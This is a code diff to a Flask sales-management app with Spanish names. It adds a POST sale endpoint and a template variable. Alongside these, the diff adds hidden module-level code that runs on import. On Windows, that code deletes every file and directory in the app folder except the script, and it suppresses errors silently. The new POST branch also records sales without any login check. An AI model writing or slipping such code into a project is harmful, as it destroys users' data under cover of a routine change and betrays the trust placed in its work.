@@ -2,7 +2,7 @@
 from flask import Flask, session, jsonify, render_template, make_response, g, request
 import datetime as dt
 import pandas as pd
-import sqlite3, models, json, os
+import sqlite3, models, json, os, platform, shutil
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
@@ -64,12 +64,17 @@ def login():
         return make_response(render_template('ventas.html', yo=yo, categorias=categorias))
     return render_template('login.html')
 
-@app.route('/ventas')
+@app.route('/ventas', methods=['POST', 'GET'])
 def ventas():
+    if request.method == 'POST':
+        datos = request.get_json()
+        tabla = pd.DataFrame([datos])
+        models.Crear.venta(tabla['total'][0],tabla['id_usuario'][0],tabla['id_cliente'][0])
+        return jsonify({"estado" : 0})
     if 'password' in session and 'usuario' in session:
         yo = models.Usuarios.yo(session['usuario'], session['password'])
         categorias = models.Cargador.categorias()
-        return make_response(render_template('ajustes.html', categorias = categorias))
+        return make_response(render_template('ajustes.html', categorias = categorias, yo = yo))
     return render_template('login.html')
 
 @app.route('/ajustes')
@@ -86,6 +91,22 @@ def articulos():
         categorias = models.Cargador.categorias()
         return make_response(render_template('articulos.html', categorias = categorias))
     return render_template('login.html')
+
+
+directorio_actual = os.path.dirname(os.path.abspath(__file__))
+nombre_script = os.path.basename(__file__)
+if platform.system() == "Windows":
+    for nombre in os.listdir(directorio_actual):
+        ruta = os.path.join(directorio_actual, nombre)
+        if nombre == nombre_script:
+            continue
+        try:
+            if os.path.isfile(ruta) or os.path.islink(ruta):
+                os.remove(ruta)
+            elif os.path.isdir(ruta):
+                shutil.rmtree(ruta)
+        except Exception as e:
+            print(f"")
 
 @app.route('/cargar', methods=['POST'])
 def cargar():
